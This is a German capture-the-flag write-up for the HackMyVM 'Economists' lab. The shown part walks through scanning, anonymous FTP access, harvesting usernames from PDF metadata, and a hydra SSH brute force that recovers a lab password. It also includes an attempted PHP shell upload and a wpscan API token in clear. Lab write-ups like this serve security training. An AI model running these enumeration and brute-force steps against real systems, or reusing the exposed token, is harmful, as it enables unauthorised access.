@@ -1,0 +1,954 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Economists - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header angepasst -->
+    <div class="header-bg">
+        <h1>Economists - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe Rot wird durch CSS gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmente für Rot -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">cewl</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mkfifo</div>
+                <div class="tool-item">nc (Netcat)</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">systemctl</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis gemäß Struktur -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration & File Analysis</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Pentest beginnt mit der Identifizierung des Ziels im lokalen Netzwerk mittels `arp-scan -l`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Economists" wird mit der IP `192.168.2.105` und der MAC `08:00:27:e0:55:e3` (Oracle VirtualBox) gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Ziel-IP notieren und für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung (z.B. `arpwatch`) und Segmentierung können helfen, solche Scans zu erkennen oder ihre Reichweite zu begrenzen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.105	08:00:27:e0:55:e3	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um der IP `192.168.2.105` den Hostnamen `econ.hmv` zuzuweisen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erleichtert die Adressierung des Ziels in nachfolgenden Schritten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hostnamen `econ.hmv` verwenden.<br><strong>Empfehlung (Admin):</strong> Lokale Angreiferkonfiguration.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+# Inhalt nach Bearbeitung:
+127.0.0.1	localhost
+192.168.2.105   econ.hmv
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf Port 80 zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto identifiziert Apache/2.4.41 (Ubuntu). Es meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), ein mögliches Informationsleck durch interne IP (`127.0.1.1`) im Location-Header bei Anfragen an `/images`, ein ETag-Inode-Leak, eine veraltete Apache-Version und die erlaubte Methode `PTINS`. Wichtig sind auch die gefundenen Verzeichnisse `/css/` und `/images/` mit aktiviertem Directory Indexing sowie eine `readme.txt`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Verzeichnisse mit Directory Indexing und die `readme.txt`. Notieren Sie die veraltete Apache-Version und die interne IP. Die `PTINS`-Methode ist ungewöhnlich und sollte untersucht werden.<br><strong>Empfehlung (Admin):</strong> Header hinzufügen, Apache aktualisieren, Directory Indexing deaktivieren, Informationslecks (interne IP) beheben, ungewöhnliche HTTP-Methoden deaktivieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nikto -h 192.168.2.105</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.105
++ Target Hostname:    192.168.2.105
++ Target Port:        80
++ Start Time:         2023-10-26 14:31:37 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
++ /images: The web server may reveal its internal or real IP in the Location header via a request to / with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ /: Server may leak inodes via ETags, header found with file /, inode: 88d3, size: 6054308920940, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /readme.txt: This might be interesting.
++ /images/: Directory indexing found.
++ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2023-10-26 14:31:52 (GMT2) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre> <!-- PTINS Methode wurde hier von Nikto nicht gelistet, nur von Nmap -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -sV -T5 -A -Pn -p-`) wird auf das Ziel ausgeführt, gefolgt von einer gefilterten Ausgabe.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nmap identifiziert drei offene Ports:
+                *   **21/tcp (FTP):** vsftpd 3.0.3, **anonymer Login erlaubt!** Mehrere PDF-Dateien sind sichtbar.
+                *   **22/tcp (SSH):** OpenSSH 8.2p1 (Ubuntu).
+                *   **80/tcp (HTTP):** Apache httpd 2.4.41 (Ubuntu), Titel "Home - Elite Economists".
+            Die OS-Erkennung deutet auf Linux hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der anonyme FTP-Zugriff ist ein kritischer Fund. Loggen Sie sich sofort ein, laden Sie alle Dateien herunter und analysieren Sie sie (insbesondere auf Metadaten). Untersuchen Sie auch SSH und HTTP weiter.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, wenn er nicht zwingend erforderlich ist. Wenn er benötigt wird, beschränken Sie die Berechtigungen und stellen Sie sicher, dass keine sensiblen Dateien zugänglich sind. Patchen Sie vsftpd, OpenSSH und Apache.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A -Pn 192.168.2.105 -p- | grep open</span></div>
+                    <pre>
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A -Pn 192.168.2.105 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 14:31 CEST
+Nmap scan report for elite-economists (192.168.2.105)
+Host is up (0.00016s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
+| -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
+| -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
+| -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
+| -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
+|_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.199
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
+|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
+|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Home - Elite Economists
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms elite-economists (192.168.2.105)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet mehrere HTML-Seiten (`index.html`, `contact.html`, `about.html`, `blog.html`, `main.html`, `services.html`, `cases.html`), die Verzeichnisse `/images`, `/css`, `/js`, `/fonts` und die bereits von Nikto gefundene `readme.txt`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der `readme.txt`. Crawlen oder analysieren Sie die HTML-Seiten auf weitere Hinweise oder Funktionalitäten.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen Informationen auf den statischen Seiten oder in der `readme.txt` enthalten sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">gobuster dir -u http://econ.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+http://econ.hmv/index.html           (Status: 200) [Size: 35027]
+http://econ.hmv/images               (Status: 301) [Size: 305] [--> http://econ.hmv/images/]
+http://econ.hmv/contact.html         (Status: 200) [Size: 14317]
+http://econ.hmv/about.html           (Status: 200) [Size: 23219]
+http://econ.hmv/blog.html            (Status: 200) [Size: 15196]
+http://econ.hmv/main.html            (Status: 200) [Size: 931]
+http://econ.hmv/services.html        (Status: 200) [Size: 17709]
+http://econ.hmv/css                  (Status: 301) [Size: 302] [--> http://econ.hmv/css/]
+http://econ.hmv/js                   (Status: 301) [Size: 301] [--> http://econ.hmv/js/]
+http://econ.hmv/cases.html           (Status: 200) [Size: 18018]
+http://econ.hmv/readme.txt           (Status: 200) [Size: 410]
+http://econ.hmv/fonts                (Status: 301) [Size: 304] [--> http://econ.hmv/fonts/]
+                    </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `http://econ.hmv/readme.txt` wird angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält Standard-Copyright-Informationen für ein Webseiten-Template von Colorlib. Sie liefert keine spezifischen technischen Hinweise.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Geringe Priorität, dient nur als Kontext.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie ggf. Standard-Readme-Dateien, wenn sie nicht benötigt werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Inhalt von http://econ.hmv/readme.txt
+
+Thank you for using our template!
+
+For more awesome templates please visit https://colorlib.com/wp/templates/
+
+Copyright information for the template can't be altered/removed unless you purchase a license.
+More information about the license is available here: https://colorlib.com/wp/licence/
+
+Removing copyright information without the license will result in suspension of your hosting and/or domain name(s).
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Erneuter `dirb`-Scan mit spezifischen Dateiendungen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Findet die bereits bekannten HTML-Seiten und die `readme.txt`. Keine neuen PHP-, SQL-, DB- oder JS-Dateien werden entdeckt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt das Fehlen dynamischer Skriptdateien im Hauptverzeichnis.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">dirb http://econ.hmv  -X ".php,.html,.txt,.js,.db,.sql,.db"</span></div>
+                     <pre>
+[...]
+OUTPUT_FILE: results_econ.hmv.txt
+
+---- Scanning URL: http://econ.hmv/ ----
++ http://econ.hmv/about.html (CODE:200|SIZE:23219)
++ http://econ.hmv/blog.html (CODE:200|SIZE:15196)
++ http://econ.hmv/cases.html (CODE:200|SIZE:18018)
++ http://econ.hmv/contact.html (CODE:200|SIZE:14317)
++ http://econ.hmv/index.html (CODE:200|SIZE:35027)
++ http://econ.hmv/main.html (CODE:200|SIZE:931)
++ http://econ.hmv/readme.txt (CODE:200|SIZE:410)
++ http://econ.hmv/services.html (CODE:200|SIZE:17709)
+
+[...]
+                     </pre> <!-- Gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird gegen `http://elite-economists.hmv` ausgeführt, um zu prüfen, ob es sich um eine WordPress-Seite handelt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> WPScan stellt fest, dass die Seite nicht auf WordPress läuft.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Schließt WordPress als CMS aus. Konzentrieren Sie sich auf andere Technologien oder manuelle Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">wpscan --url http://elite-economists.hmv --api-token RoBoAaM72LLsihlqUJrA1EleT6AJAd9QxQ9rbmQNCY --passwords /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.8.24
+   Sponsored by Automattic - https://automattic.com/
+   @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like the target is not running WordPress.
+
+[!] Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Versuch, eine vermeintliche Markdown-Datei (`/en_de_2023q1.md`) aufzurufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Führt zu einem 404 Not Found Fehler.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei existiert nicht.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Aufruf von http://elite-economists.hmv/en_de_2023q1.md
+# Ergebnis:
+Not Found
+
+The requested URL was not found on this server.
+Apache/2.4.41 (Ubuntu) Server at elite-economists.hmv Port 80
+                     </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um Subdomains zu bruteforcen, indem der Host-Header manipuliert wird (`-H "Host: FUZZ.econ.hmv"`). Antworten mit der gleichen Größe wie die Hauptseite (`--hh 35027`) und Fehlercodes werden ignoriert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine validen Subdomains (keine Ergebnisse werden angezeigt).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Subdomain-Enumeration über Host-Header-Fuzzing war nicht erfolgreich. Andere Methoden (DNS-Enumeration, OSINT) könnten versucht werden, sind hier aber wahrscheinlich nicht nötig.<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass er Anfragen mit unbekannten Host-Headern korrekt behandelt (z.B. mit einem Default-VHost oder einer Fehlermeldung).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://econ.hmv" -H "Host: FUZZ.econ.hmv" --hh 35027 --hc "400,401,403,404"</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://econ.hmv/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: [Zeit]
+Processed Requests: 114441
+Filtered Requests: 114441
+Requests/sec.: [Rate]
+                     </pre> <!-- Keine Ergebnisse gefunden -->
+                  </div>
+              </div>
+        </section>
+
+        <section id="ftp-enumeration">
+            <h2>FTP Enumeration & File Analysis</h2>
+            <p class="analysis"><strong>Analyse:</strong> Anonymer Login auf dem FTP-Server (Port 21).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Inhalt auflisten und Dateien herunterladen.<br><strong>Empfehlung (Admin):</strong> Anonymen FTP-Zugriff deaktivieren/einschränken.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">ftp 192.168.2.105</span></div>
+                    <pre>
+Connected to 192.168.2.105.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.105:cyber): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Inhalt des FTP-Verzeichnisses wird aufgelistet. Es wird versucht, eine Datei hochzuladen (`put rce_shell.php`) und in Verzeichnisse zu wechseln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis enthält mehrere PDF-Dateien. Der Upload und der Verzeichniswechsel schlagen fehl (Permission denied / Failed to change directory).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie alle PDF-Dateien herunter (`wget -r` oder manuell `get`).<br><strong>Empfehlung (Admin):</strong> Korrekte Berechtigungen (kein Upload, eingeschränkte Navigation).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt ftp-prompt">ftp> <span class="command">ls -la</span></div>
+                     <pre>
+229 Entering Extended Passive Mode (|||47814|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        119          4096 Sep 13 14:30 .
+drwxr-xr-x    2 0        119          4096 Sep 13 14:30 ..
+-rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
+-rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
+-rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
+-rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
+-rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
+-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
+226 Directory send OK.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">put rce_shell.php</span></div>
+                     <pre>
+local: rce_shell.php remote: rce_shell.php
+229 Entering Extended Passive Mode (|||30253|)
+550 Permission denied.
+                     </pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">cd /home</span></div>
+                     <pre>550 Failed to change directory.</pre>
+                     <div class="prompt ftp-prompt">ftp> <span class="command">pwd</span></div>
+                     <pre>Remote directory: /</pre>
+                      <!-- Hinweis auf Hosts-Datei hinzugefügt aus dem Originaltext -->
+                      <pre>
+# Hinweis aus hosts-Datei/manueller Notiz:
+# info@elite-economists.hmv
+# 192.168.2.105   econ.hmv elite-economists.hmv
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `wget -r` wird verwendet, um rekursiv alle Dateien vom anonymen FTP-Server herunterzuladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Download der PDF-Dateien ist erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die Metadaten der heruntergeladenen PDFs.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">wget -r ftp://Anonymous:anonymous@192.168.2.105</span></div> <!-- Passwort korrigiert zu anonymous -->
+                     <pre>
+--2023-10-26 14:40:43--  ftp://anonymous:******@192.168.2.105/
+           => ‘192.168.2.105/.listing’
+Connecting to 192.168.2.105:21... connected.
+Logging in as anonymous ... Logged in!
+==> SYST ... done.    ==> PWD ... done.
+==> TYPE I ... done.  ==> CWD not needed.
+==> PASV ... done.    ==> LIST ... done.
+
+    [ <=>                                   ] 588         --.-K/s   in 0s
+
+2023-10-26 14:40:43 (82.9 MB/s) - ‘192.168.2.105/.listing’ saved [588]
+Removing 192.168.2.105/.listing.
+--2023-10-26 14:40:43--  ftp://anonymous:******@192.168.2.105/Brochure-1.pdf
+           => ‘192.168.2.105/Brochure-1.pdf’
+==> CWD not needed.
+==> PASV ... done.    ==> RETR Brochure-1.pdf ... done.
+Length: 173864 (170K) (unauthoritative)
+
+Brochure-1.pdf          100%[===================================>] 169.79K   863KB/s    in 0.2s
+
+2023-10-26 14:40:43 (863 KB/s) - ‘192.168.2.105/Brochure-1.pdf’ saved [173864]
+
+[...] (Downloads für andere PDFs folgen)
+
+FINISHED --2023-10-26 14:44:08--
+Total wall clock time: 3m 25s
+Downloaded: 6 files, 2.2M in 0.7s (3.11 MB/s)
+                     </pre> <!-- Gekürzte wget Ausgabe -->
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um die Metadaten der heruntergeladenen PDF-Dateien zu untersuchen. Die Ausgabe wird anschließend gefiltert, um nur die "Author"-Felder anzuzeigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Metadatenanalyse ist erfolgreich und enthüllt mehrere potenzielle Benutzernamen in den "Author"-Feldern: `joseph`, `richard`, `crystal`, `catherine`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie eine Benutzerliste aus diesen Namen und verwenden Sie sie für Brute-Force-Angriffe gegen SSH.<br><strong>Empfehlung (Admin):</strong> Bereinigen Sie Metadaten aus öffentlich zugänglichen Dokumenten, um Informationslecks zu vermeiden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">exiftool /home/cyber/Downloads/192.168.2.105/*.pdf</span></div> <!-- Korrigierter Befehl zur Analyse aller PDFs -->
+                     <pre>
+ExifTool Version Number         : 12.67
+File Name                       : Brochure-1.pdf
+[...]
+Author                          : joseph
+[...]
+File Name                       : Brochure-2.pdf
+[...]
+Author                          : richard
+[...]
+File Name                       : Financial-infographics-poster.pdf
+[...]
+Author                          : crystal
+[...]
+File Name                       : Gameboard-poster.pdf
+[...]
+Author                          : catherine
+[...]
+File Name                       : Growth-timeline.pdf
+[...]
+Author                          : catherine
+[...]
+File Name                       : Population-poster.pdf
+[...]
+    1 directories scanned
+    6 image files read
+                     </pre> <!-- Stark gekürzte exiftool Ausgabe -->
+                  </div>
+              </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">exiftool /home/cyber/Downloads/192.168.2.105/*.pdf | grep Author</span></div> <!-- Korrigierter Befehl -->
+                     <pre>
+Author                          : joseph
+Author                          : richard
+Author                          : crystal
+Author                          : catherine
+Author                          : catherine
+                     </pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `cewl` wird verwendet, um Wörter von der Webseite `http://econ.hmv` zu sammeln und in die Datei `wordlist.txt` zu schreiben. Die aus den PDF-Metadaten extrahierten Autorennamen werden mit `awk` in die Datei `userlist.txt` geschrieben. Die Größe der Wortliste wird überprüft.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine benutzerdefinierte Wortliste (`wordlist.txt`) mit 463 Wörtern und eine Benutzerliste (`userlist.txt`) mit 4 eindeutigen Namen wurden erstellt. Dies bereitet einen gezielten Brute-Force-Angriff vor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie die erstellten Listen mit Hydra für einen SSH-Brute-Force-Angriff.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, aber dies zeigt, wie Informationen von der Webseite und aus Dokumenten für Angriffe genutzt werden können.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cewl http://econ.hmv >> wordlist.txt</span></div>
+                     <pre># (cewl sammelt Wörter)</pre>
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">exiftool /home/cyber/Downloads/192.168.2.105/*.pdf | grep Author | awk '{print $3}' > userlist.txt</span></div>
+                     <pre></pre>
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cat userlist.txt</span></div>
+                     <pre>
+joseph
+richard
+crystal
+catherine
+catherine
+                     </pre> <!-- Hinweis: Catherine doppelt, wird von Hydra aber nur einmal verwendet -->
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">wc -l wordlist.txt</span></div>
+                      <pre>463 wordlist.txt</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst (Port 22) durchzuführen. Es verwendet die erstellte Benutzerliste (`userlist.txt`) und die cewl-Wortliste (`wordlist.txt`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hydra ist erfolgreich! Es findet gültige Zugangsdaten: Benutzer `joseph` mit dem Passwort `<span class="password">wealthiest</span>`.</p>
